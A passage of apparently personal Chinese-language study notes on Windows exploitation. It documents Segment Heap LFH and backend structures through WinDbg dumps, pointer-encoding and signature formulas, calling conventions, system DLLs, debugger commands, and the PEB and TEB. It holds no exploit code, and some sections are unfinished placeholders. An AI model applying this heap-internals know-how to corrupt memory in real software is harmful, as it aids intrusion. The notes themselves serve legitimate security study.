<code>Allocated</code> 为 0</li><li>通过 <code>UnsafePrevSize</code> 判断是否有前一个空闲 chunk，然后判断其allocate位是否为0；同样判断后一个相邻 chunk</li></ol></li><li>如果在 LFH 范围且未开启 LFH （即对应 <code>Buckets</code> 为初始化）则将对应 <code>LfhContext-&gt;Bucket</code> 减 1 （与 Nt Heap 相同）。</li></ol><p>其他检查后续补充</p><h3 id="LFH堆-1"><a href="#LFH堆-1" class="headerlink" title="LFH堆"></a>LFH堆</h3><p>LFH 堆分配的 chunk 没有 chunk header</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764576906996.png" alt="1764576906996"></p><h4 id="相关结构体-3"><a href="#相关结构体-3" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="HEAP-LFH-CONTEXT"><a href="#HEAP-LFH-CONTEXT" class="headerlink" title="_HEAP_LFH_CONTEXT"></a>_HEAP_LFH_CONTEXT</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dx -r1 (*((ntdll!_HEAP_LFH_CONTEXT *)0x17025b50380))</span><br><span class="line">(*((ntdll!_HEAP_LFH_CONTEXT *)0x17025b50380))                 [Type: _HEAP_LFH_CONTEXT]</span><br><span class="line">    [+0x000] BackendCtx       : 0x17025b50140 [Type: void *]</span><br><span class="line">    [+0x008] Callbacks        [Type: _HEAP_SUBALLOCATOR_CALLBACKS]</span><br><span class="line">    [+0x030] AffinityModArray : 0x7fffa38e83db : 0x1 [Type: unsigned char *]</span><br><span class="line">    [+0x038] MaxAffinity      : 0x10 [Type: unsigned char]</span><br><span class="line">    [+0x039] LockType         : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x03a] MemStatsOffset   : -768 [Type: short]</span><br><span class="line">    [+0x03c] Config           [Type: _RTL_HP_LFH_CONFIG]</span><br><span class="line">    [+0x040] BucketStats      [Type: _HEAP_LFH_SUBSEGMENT_STATS]</span><br><span class="line">    [+0x048] SubsegmentCreationLock : 0x0 [Type: unsigned __int64]</span><br><span class="line">    [+0x080] Buckets          [Type: _HEAP_LFH_BUCKET * [129]]</span><br></pre></td></tr></table></figure><p><code>BackendCtx</code>：指向 LFH 堆的后端堆分配器，即 <code>_SEGMENT_HEAP.SegContexts (_HEAP_SEG_CONTEXT)</code>指针未加密</p><p><code>Callbacks</code>：函数指针集合，<code>RtlpHpHeapGlobals.HeapKey ^ LFHContext_addr ^ func_ptr</code></p><ul><li><code>Allocate</code>：<code>RtlpHpSegLfhAllocate</code></li><li><code>Free</code>：<code>RtlpHpSegLfhVsFree</code></li><li><code>Commit</code>：<code>RtlpHpSegLfhVsCommit</code></li><li><code>Decommit</code>：<code>RtlpHpSegLfhVsDecommit</code></li></ul><p><code>Config (_RTL_HP_LFH_CONFIG)</code>：用于表示 LFH 管理堆块的属性。</p><ul><li><code>MaxBlockSize</code>：决定多大的堆块适用于 LFH 分配。</li><li><code>WitholdPageCrossingBlocks</code>：是否有跨页块。</li><li><code>DisableRandomization</code>：是否关闭 LFH 分配随机化。</li></ul><p><code>Buckets (_HEAP_LFH_BUCKET )</code>：<code>Buckets</code> 指针数组，通过最低位区分为 <code>_HEAP_LFH_BUCKET</code> 结构体和单纯的计数作用。</p><ul><li>如果 LFH 启动，每个 <code>Bucket</code> 存储了对应 <code>Size</code> 的 <code>_HEAP_LFH_BUCKET</code> 结构体地址。</li><li>如果 LFH 未启动，每个 <code>Bucket</code> 低 2 字节恒为 0x0001 ，高 2 字节存储了当前 <code>Size</code> 堆块的分配次数，每分配一次加 0x21，每释放一次减 1 。</li></ul><h5 id="HEAP-LFH-BUCKET"><a href="#HEAP-LFH-BUCKET" class="headerlink" title="_HEAP_LFH_BUCKET"></a>_HEAP_LFH_BUCKET</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _HEAP_LFH_BUCKET</span><br><span class="line">ntdll!_HEAP_LFH_BUCKET</span><br><span class="line">   +0x000 State            : _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +0x038 TotalBlockCount  : Uint8B</span><br><span class="line">   +0x040 TotalSubsegmentCount : Uint8B</span><br><span class="line">   +0x048 ReciprocalBlockSize : Uint4B</span><br><span class="line">   +0x04c Shift            : UChar</span><br><span class="line">   +0x04d ContentionCount  : UChar</span><br><span class="line">   +0x050 AffinityMappingLock : Uint8B</span><br><span class="line">   +0x058 ProcAffinityMapping : Ptr64 UChar</span><br><span class="line">   +0x060 AffinitySlots    : Ptr64 Ptr64 _HEAP_LFH_AFFINITY_SLOT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>State (_HEAP_LFH_SUBSEGMENT_OWNER)</code>：用于记录 <code>Buckets</code> 的状态。</p><p><code>AffinitySlots (_HEAP_LFH_AFFINITY_SLOT)</code>： 存储了当前 <code>Bucket</code> 的 subsegment 管理信息。默认只有一个。</p><h5 id="HEAP-LFH-SUBSEGMENT-OWNER"><a href="#HEAP-LFH-SUBSEGMENT-OWNER" class="headerlink" title="_HEAP_LFH_SUBSEGMENT_OWNER"></a>_HEAP_LFH_SUBSEGMENT_OWNER</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">ntdll!_HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +0x000 IsBucket         : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Spare0           : Pos 1, 7 Bits</span><br><span class="line">   +0x001 BucketIndex      : UChar</span><br><span class="line">   +0x002 SlotCount        : UChar</span><br><span class="line">   +0x002 SlotIndex        : UChar</span><br><span class="line">   +0x003 Spare1           : UChar</span><br><span class="line">   +0x008 AvailableSubsegmentCount : Uint8B</span><br><span class="line">   +0x010 Lock             : Uint8B</span><br><span class="line">   +0x018 AvailableSubsegmentList : _LIST_ENTRY</span><br><span class="line">   +0x028 FullSubsegmentList : _LIST_ENTRY</span><br></pre></td></tr></table></figure><p><code>IsBucket</code>：区分是在 <code>Bucket</code> 上还是在 <code>AffinitySlots</code> 上， <code>Bucket</code> 中的 <code>State</code> 为1 。</p><p><code>BucketIndex</code>：当前 <code>Bucket</code> 的编号，通常可以利用这个值查找全局数组 <code>RtlpBucketBlockSizes</code> 来获取 <code>BlockSize</code>：<code>RtlpBucketBlockSizes[State.BucketIndex]</code></p><p><code>AvailableSubsegmentCount</code>：目前可用于分配的的 LFH Subsegments 数量。</p><p><code>AvailableSubsegmentList</code>：指向下一个可用的 LFH subsegment 。</p><p><code>FullSubsegmentList</code>：指向下一个全被使用的 LFH subsegment 。</p><h5 id="HEAP-LFH-SUBSEGMENT"><a href="#HEAP-LFH-SUBSEGMENT" class="headerlink" title="_HEAP_LFH_SUBSEGMENT"></a>_HEAP_LFH_SUBSEGMENT</h5><p>通过 <code>Buckets-&gt;AffinitySlots</code> 管理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _HEAP_LFH_SUBSEGMENT</span><br><span class="line">ntdll!_HEAP_LFH_SUBSEGMENT</span><br><span class="line">   +0x000 ListEntry        : _LIST_ENTRY</span><br><span class="line">   +0x010 Owner            : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER</span><br><span class="line">   +0x010 DelayFree        : _HEAP_LFH_SUBSEGMENT_DELAY_FREE</span><br><span class="line">   +0x018 CommitLock       : Uint8B</span><br><span class="line">   +0x020 FreeCount        : Uint2B</span><br><span class="line">   +0x022 BlockCount       : Uint2B</span><br><span class="line">   +0x020 InterlockedShort : Int2B</span><br><span class="line">   +0x020 InterlockedLong  : Int4B</span><br><span class="line">   +0x024 FreeHint         : Uint2B</span><br><span class="line">   +0x026 Location         : UChar</span><br><span class="line">   +0x027 WitheldBlockCount : UChar</span><br><span class="line">   +0x028 BlockOffsets     : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS</span><br><span class="line">   +0x02c CommitUnitShift  : UChar</span><br><span class="line">   +0x02d CommitUnitCount  : UChar</span><br><span class="line">   +0x02e CommitStateOffset : Uint2B</span><br><span class="line">   +0x030 BlockBitmap      : [1] Uint8B</span><br></pre></td></tr></table></figure><p><code>ListEntry</code>：指向前（后）一个 LFH Subsegment</p><p><code>FreeCount</code>：LFH Subsegment 中空闲 <code>Block</code> 的数量。</p><p><code>BlockCount</code>：LFH Subsegment 中 <code>Block</code> 的数量。</p><p><code>FreeHint</code>：释放的 <code>Block</code> 中的最小下标。</p><p><code>Location</code>：标记该 LFH Subsegment 所在的位置。</p><ul><li>0：<code>AvailableSubsegmentList</code></li><li>1：<code>FullSubsegmentList</code></li><li>2：表示 FLH Subsegment 不在链表中</li></ul><p><code>BlockOffsets (_HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS)</code>：被加密为 <code>EncodedData = RtlpHpHeapGlobals.LfhKey ^ BlockOffsets ^ (Subsegment &gt;&gt; 12)</code> 。</p><p><code>BlockBitmap</code>：每个 LFH 块的状态由该块位图中的 2 个比特表示。</p><ul><li>bit 0：is busy bit</li><li>bit 1：unused bytes</li></ul><p><code>Block</code>：分配器返回给用户的内存。对于已分配的 <code>Block</code> 如果 <code>UnusedBytes</code> 不为 0 会把 <code>Block</code> 在最后 2 字节作为 <code>UnusedBytes</code> ，如果 <code>UnusedBytes</code> 为 1则将最后 2 字节置为 0x8000</p><h4 id="分配-1"><a href="#分配-1" class="headerlink" title="分配"></a>分配</h4><p>aaa</p><h4 id="释放-1"><a href="#释放-1" class="headerlink" title="释放"></a>释放</h4><p>aaa</p><h3 id="后端堆-1"><a href="#后端堆-1" class="headerlink" title="后端堆"></a>后端堆</h3><h4 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h4><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764636569750.png" alt="1764636569750"></p><h5 id="HEAP-SEG-CONTEXT"><a href="#HEAP-SEG-CONTEXT" class="headerlink" title="_HEAP_SEG_CONTEXT"></a>_HEAP_SEG_CONTEXT</h5><p><code>SegmentMask</code>：用于从 <code>BlockPtr</code> 找到 <code>PageSegment</code> ： <code>PageSegment = BlockPtr &amp; SegmentMask</code> 。</p><p><code>UnitShift</code>：一个 <code>PageDescriptor</code> 维护的内存的大小关于 2 取对数，用于计算 <code>BlockPtr</code> 所在 <code>Page</code> 对应的 <code>PageDescriptor</code> 的下标：<code>Index = BlockPtr &gt;&gt; UnitShift</code> 。</p><p><code>PagePerUnitShift</code>：一个 <code>PageDescriptor</code> 维护的内存的的内存页数（即大小除以 0x1000）关于 2 取对数。</p><p><code>FirstDescriptorIndex</code>：第一个 <code>PageDescriptor</code> 在 <code>SegContext</code> 中的下标。</p><p><code>LfhContext</code>：指向 Segment Heap 的 <code>LfhContext</code> 。</p><p><code>VsContext</code>：指向 Segment Heap 的 <code>VsContext</code> 。</p><p><code>Heap</code>：指向所属的 Segment Heap 。</p><p><code>SegmentListHead</code>：指向 <code>PageSegment</code> 的双向链表。</p><p><code>SegmentCount</code>：<code>PageSegment</code> 的数量。</p><p><code>FreePageRanges</code>：维护空闲的 Subsegment 的红黑树，树的节点为 <code>PageSegment.DescArray</code> 中的元素。与 VS 堆的 <code>FreeChunkTree</code> 相似。</p><p><code>FreeSegmentList</code>：存放空闲的 <code>PageSegment</code> 。</p><h5 id="HEAP-PAGE-SEGMENT"><a href="#HEAP-PAGE-SEGMENT" class="headerlink" title="_HEAP_PAGE_SEGMENT"></a>_HEAP_PAGE_SEGMENT</h5><p><code>ListEntry</code>：连接链表中的前后 <code>PageSegment</code> 。</p><p><code>Signature</code>：用来检验 <code>PageSegment</code> 是否有效，通过 <code>PageSegment ^ SegContext ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD</code> 计算。</p><p><code>DescArray (_HEAP_PAGE_RANGE_DESCRIPTOR)</code>：数组中的每个元素对应描述 <code>PageSegment</code> 中一个内存页的状态。</p><h5 id="HEAP-PAGE-RANGE-DESCRIPTOR"><a href="#HEAP-PAGE-RANGE-DESCRIPTOR" class="headerlink" title="_HEAP_PAGE_RANGE_DESCRIPTOR"></a>_HEAP_PAGE_RANGE_DESCRIPTOR</h5><p>页面描述符指示页面段中每个页面的状态（已分配或已释放）和信息（页面是否为块的开始、块的大小等）。它可以被划分为已分配和释放。</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764637028567.png" alt="1764637028567"></p><p><code>TreeSignature</code>：<code>PageRangeDescriptor</code> 的签名，值为恒为 0xCCDDCCDD 。只在 <code>Block</code> 的开头对应的 <code>PageRangeDescriptor</code> 才有。<code>UnusedBytes</code>：申请的块未使用的部分的大小。</p><p><code>RangeFlag</code>：表示页的状态。</p><ul><li>Bit 1：allocted bit</li><li>Bit 2：block header bit</li><li>Bit 3：Commited<ul><li>LFH：<code>RangeFlag &amp; 0xc = 8</code></li><li>VS：<code>RangeFlag &amp; 0xc = 0xc</code></li></ul></li><li><code>CommitedPageCount</code>：表示相应页面中提交的页数。</li><li><code>key (_HEAP_DESCRIPTOR_KEY)</code>：存储与 <code>PageRangeDescriptor</code> 对应的页面的一些相关信息。</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764637185001.png" alt="1764637185001"></p><p><code>TreeNode (_RTL_BALANCED_NODE)</code>：</p><ul><li><code>Left</code>：指向大小小于当前 <code>PageRangeDescriptor</code> 对应 <code>Block</code> 的 <code>Block</code> 对应的 <code>PageRangeDescriptor</code> 。</li><li><code>Right</code>：指向大小大于当前 <code>PageRangeDescriptor</code> 对应 <code>Block</code> 的 <code>Block</code> 对应的 <code>PageRangeDescriptor</code> 。</li><li><code>ParentValue</code>：指向父节点，指针最低 1 比特表示是否加密。</li></ul><h4 id="分配-2"><a href="#分配-2" class="headerlink" title="分配"></a>分配</h4><h4 id="释放-2"><a href="#释放-2" class="headerlink" title="释放"></a>释放</h4>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（一）</title>
      <link href="/2025/10/04/2025-10-4-learning_windows_pwn_1/"/>
      <url>/2025/10/04/2025-10-4-learning_windows_pwn_1/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><table><thead><tr><th>调用约定</th><th>定义</th><th>参数传递</th><th>栈平衡</th><th>特点</th><th>应用场景</th></tr></thead><tbody><tr><td><strong>__cdecl</strong></td><td>C语言默认调用约定</td><td>参数从右向左依次压入栈中</td><td>调用者(caller)负责清理栈空间</td><td>支持可变参数函数(VARARG)，因为调用者知道传递了多少参数</td><td>C&#x2F;C++程序中的普通函数默认使用此约定</td></tr><tr><td><strong>__stdcall</strong></td><td>标准调用约定</td><td>参数从右向左依次压入栈中</td><td>被调用函数(callee)负责清理栈空间</td><td>生成的代码比__cdecl小，因为不需要在每个调用点都包含栈清理代码</td><td>Windows API函数主要使用此约定</td></tr><tr><td><strong>__fastcall</strong></td><td>快速调用约定</td><td>前两个DWORD或更小的参数通过寄存器(ECX和EDX)传递，其余参数从右向左压栈</td><td>被调用函数(callee)负责清理栈空间</td><td>通过寄存器传递参数提高函数调用速度</td><td>需要高性能的函数调用场景</td></tr><tr><td><strong>__thiscall</strong></td><td>C++成员函数调用约定</td><td>this指针通过ECX寄存器传递，其余参数从右向左压栈</td><td>被调用函数(callee)负责清理栈空间</td><td>专为C++类成员函数设计</td><td>C++类的非静态成员函数调用</td></tr></tbody></table><ul><li>VARARG 表示参数的个数可以是不确定的，如果使用 VARARG 参数类型，就是调用程序平衡栈，否则按照默认方式平衡栈。</li><li><code>__fastcall</code> 传参规则为前两个参数通过 ecx 和 edx 传递，之后的参数通过栈传递。</li><li><code>__thiscall</code> 传参规则为 ecx 传递 this 指针，其余参数按照从右到左顺序入栈。</li></ul><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><ul><li><code>__thiscall</code> 传参规则为 rcx 传递 this 指针，前三个参数通过 rdx、r8、r9 传递，剩余参数布置在栈中。</li><li>其他类型的函数调用传参规则为前四个参数通过 rcx、rdx、r8、r9，剩余参数布置在栈中。</li><li>栈平衡由调用者完成。</li></ul><p>这里需要着重强调一下 windows 64 位函数调用的堆栈。</p><p>在函数调用前前 4 个参数放在寄存器中，第 5 个参数开始依次从 <code>[rsp + 0x20]</code> 位置处开始存放。进入调用的函数后会将寄存器中的参数存放到返回地址后空缺的位置上。</p><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759563374342.png" alt="1759563374342"></p><h2 id="常见-dll"><a href="#常见-dll" class="headerlink" title="常见 dll"></a>常见 dll</h2><ul><li><p>ntdll.dll</p><ul><li><p><strong>核心作用</strong> ：Windows系统最底层的用户模式接口</p></li><li><p><strong>包含未公开API</strong> ：</p><ul><li>实现了Windows Native API（未完全公开的系统接口）</li><li>包含如 <code>NtCreateFile</code>、<code>NtReadFile</code>、<code>NtAllocateVirtualMemory</code>等核心函数</li><li>这些API通常以 <code>Nt</code>或 <code>Zw</code>前缀开头</li></ul></li><li><p><strong>系统调用入口</strong> ：</p><ul><li>是用户模式到内核模式转换的关键桥梁</li><li>通过 <code>syscall</code>&#x2F;<code>sysenter</code>指令触发实际的系统调用</li><li>例如：<code>NtCreateFile</code>最终会触发系统调用号，进入内核的 <code>ntoskrnl.exe</code></li></ul></li><li><p><strong>各版本间不同</strong></p></li></ul></li><li><p>kernel32.dll</p><ul><li><p><strong>核心作用</strong> ：Windows API的主要封装层</p></li><li><p><strong>基础功能API</strong> ：</p><ul><li>提供堆管理（<code>HeapAlloc</code>、<code>HeapFree</code>）</li><li>虚拟内存操作（<code>VirtualAlloc</code>、<code>VirtualFree</code>）</li><li>文件I&#x2F;O（<code>CreateFile</code>、<code>ReadFile</code>、<code>WriteFile</code>）</li><li>进程&#x2F;线程管理（<code>CreateProcess</code>、<code>CreateThread</code>）</li></ul></li><li><p><strong>ntdll函数的封装</strong> ：</p><ul><li>大多数kernel32函数只是简单包装了ntdll中的对应函数</li><li>例如：<code>CreateFileW</code> → <code>BasepCreateFile</code> → <code>NtCreateFile</code></li><li>API 几乎不会修改</li></ul></li></ul></li><li><p>mscrtxxx.dll &#x2F; ucrtbase.dll</p><ul><li><strong>核心作用</strong> ：C语言运行时库的Windows实现</li></ul></li><li><p><strong>mscrtxxx.dll</strong> ：</p><ul><li>旧版Microsoft C运行时库（如msvcr120.dll）</li><li>类似于Linux中的glibc（GNU C Library）</li></ul></li><li><p><strong>ucrtbase.dll</strong> ：</p><ul><li>Windows 10引入的统一C运行时库（Universal CRT）</li></ul></li></ul><p>dll 之间的函数调用关系如下图所示：</p><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759569034306.png" alt="1759569034306"></p><h2 id="windbg调试命令"><a href="#windbg调试命令" class="headerlink" title="windbg调试命令"></a>windbg调试命令</h2><p><code>r</code> 查看寄存器状态和当前运行指令</p><p><code>lmi</code> 查看进程加载的各个模块。通过这个命令可以获得模块的加载基址。</p><p><code>!address</code> 查看更详细的段信息，类似 pwndbg 的 <code>vmmap</code> 功能。</p><p><code>!address 地址</code> 查看某个地址所在段信息。</p><p><code>dq</code> 八字节查看，<code>dd</code> 四字节查看，<code>dw</code> 两字节查看，<code>dc</code> 一字节查看</p><p><code>eq &lt;address&gt; &lt;value&gt;</code> 修改 8 字节长度的内存中的值。<code>ed</code>，<code>ew</code>，<code>eb</code> 同理，只是修改内存长度有区别。</p><p><code>bp &lt;address&gt; &quot;&lt;condition&gt;&quot;</code> 在某地址处下条件断点，例如 <code>bp 00401234 &quot;eax==0&quot;</code> 。</p><p><code>bl</code> 查看断点，直接点击 <code>Disable</code> 来暂时停用断点，点击 <code>Clear</code> 清除断点。</p><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。<code>bu EzWinHeap+0x140001566</code></p><p><code>u 地址</code> 查看某地址处的汇编，<code>u</code> 查看程序运行位置的汇编，<code>uf</code> 会一直反汇编到 ret 指令。</p><p><code>dt structure [address]</code> 把 address 当成 structure 类型的结构体解析，如果不加 address 就会单纯打印出结构体。</p><p><code>s -a 7adf0000 L100000 &quot;cmd.exe&quot;</code> 搜索字符串</p><p><code>s -q 0x00000207fbee0000 L1000 0x207fbee07c0</code> 搜索地址</p><p>程序运行到断点停止：g</p><p><code>p</code> 步过 <code>t</code> 步入 <code>gu</code> 步出 <code>k</code> 查看 trace back</p><p><code>~*</code> 用来查看所有线程的信息，可以用来获取 TEB 基址。</p><p><code>~#</code> 显示最初导致异常的线程（或在调试器附加到进程时处于活动状态）。</p><p><code>~[线程编号]s</code>：调试的时候切换线程，例如 <code>~0s</code> 表示切换到 0 号线程，这里的编号即前面 <code>~*</code> 显示在前面的 0，1，2 。</p><p><code>? 0074fbf4 - 74fa68</code> 可以进行简单运算。</p><p><code>x ucrtbased!_read</code> 打印 <code>read</code> 函数的地址和其他信息。这个命令支持通配符，比如 <code>x ucrtbased!*read</code> 。</p><h2 id="常见结构体"><a href="#常见结构体" class="headerlink" title="常见结构体"></a>常见结构体</h2><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>PEB（Process Environment Block）是 Windows 操作系统中的一个数据结构，它包含了进程的上下文信息。每个进程都有一个唯一的 PEB，它被存储在进程的用户模式地址空间中。在x86系统中位于 <code>fs:[30h]</code>，在x64系统中位于 <code>gs:[60h]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[<span class="number">1</span>];</span><br><span class="line">    PVOID Reserved3[<span class="number">2</span>];</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved4[<span class="number">104</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">52</span>];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved6[<span class="number">128</span>];</span><br><span class="line">    PVOID Reserved7[<span class="number">1</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB,*PPEB;</span><br></pre></td></tr></table></figure><p>PEB 与 TEB 的相对偏移固定，使用 <code>.process</code> 或者 <code>r $peb</code> 查看进程的 PEB 地址，随后使用 <code>dt _PEB peb_addr</code> 查看进程的 PEB 信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .process</span><br><span class="line">Implicit process is now 00c37000</span><br><span class="line">0:000&gt; r $peb</span><br><span class="line">$peb=00c37000</span><br><span class="line">0:000&gt; dt _PEB 00c37000</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +0x000 InheritedAddressSpace : 0 &#x27;&#x27;</span><br><span class="line">   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;</span><br><span class="line">   +0x002 BeingDebugged    : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x003 BitField         : 0x4 &#x27;&#x27;</span><br><span class="line">   +0x003 ImageUsesLargePages : 0y0</span><br><span class="line">   +0x003 IsProtectedProcess : 0y0</span><br><span class="line">   +0x003 IsImageDynamicallyRelocated : 0y1</span><br><span class="line">   +0x003 SkipPatchingUser32Forwarders : 0y0</span><br><span class="line">   +0x003 IsPackagedProcess : 0y0</span><br><span class="line">   +0x003 IsAppContainer   : 0y0</span><br><span class="line">   +0x003 IsProtectedProcessLight : 0y0</span><br><span class="line">   +0x003 IsLongPathAwareProcess : 0y0</span><br><span class="line">   +0x004 Mutant           : 0xffffffff Void</span><br><span class="line">   +0x008 ImageBaseAddress : 0x00540000 Void</span><br><span class="line">   +0x00c Ldr              : 0x775deb20 _PEB_LDR_DATA</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p><code>!peb</code> 查看 PEB 的具体内容，ImageBaseAddress为程序基地址，ProcessHeap为堆地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !peb</span><br><span class="line">PEB at 00c37000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         00540000</span><br><span class="line">    NtGlobalFlag:             70</span><br><span class="line">    NtGlobalFlag2:            0</span><br><span class="line">    Ldr                       775deb20</span><br><span class="line">    Ldr.Initialized:          Yes</span><br><span class="line">    Ldr.InInitializationOrderModuleList: 01075268 . 01075778</span><br><span class="line">    Ldr.InLoadOrderModuleList:           01075370 . 01077610</span><br><span class="line">    Ldr.InMemoryOrderModuleList:         01075378 . 01077618</span><br><span class="line">            Base TimeStamp                     Module</span><br><span class="line">          540000 5eff73f6 Jul 04 02:07:50 2020 C:\1\Download\easyWinHeap\EasyWinHeap.exe</span><br><span class="line">        774b0000 C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">        76030000 25e3fa57 Feb 22 22:42:31 1990 C:\Windows\System32\KERNEL32.DLL</span><br><span class="line">        76580000 53a79838 Jun 23 11:00:08 2014 C:\Windows\System32\KERNELBASE.dll</span><br><span class="line">        76b90000 C:\Windows\System32\ucrtbase.dll</span><br><span class="line">        69a10000 5e74ae97 Mar 20 19:52:55 2020 C:\1\Download\easyWinHeap\VCRUNTIME140.dll</span><br><span class="line">    SubSystemData:     00000000</span><br><span class="line">    ProcessHeap:       01070000</span><br><span class="line">    ProcessParameters: 01072c70</span><br><span class="line">    CurrentDirectory:  &#x27;C:\Windows\system32\&#x27;</span><br><span class="line">    WindowTitle:  &#x27;C:\1\Download\easyWinHeap\EasyWinHeap.exe&#x27;</span><br><span class="line">    ImageFile:    &#x27;C:\1\Download\easyWinHeap\EasyWinHeap.exe&#x27;</span><br><span class="line">    CommandLine:  &#x27;C:\1\Download\easyWinHeap\EasyWinHeap.exe&#x27;</span><br><span class="line">    DllPath:      &#x27;&lt; Name not readable &gt;&#x27;</span><br><span class="line">    Environment:  01070cf8</span><br></pre></td></tr></table></figure><h3 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h3><p>TEB（Thread Environment Block）是 Windows 操作系统中的一个线程私有的数据结构，用于存储线程相关的信息。每个线程都有一个对应的 TEB 。32 位程序 FS 寄存器指向当前线程的 TEB ，64 位程序 GS 寄存器指向当前线程的 TEB 。</p><p>使用 <code>r $teb</code> 查看进程的 TEB 地址，<code>!teb</code> 可以查看 TEB 详细信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 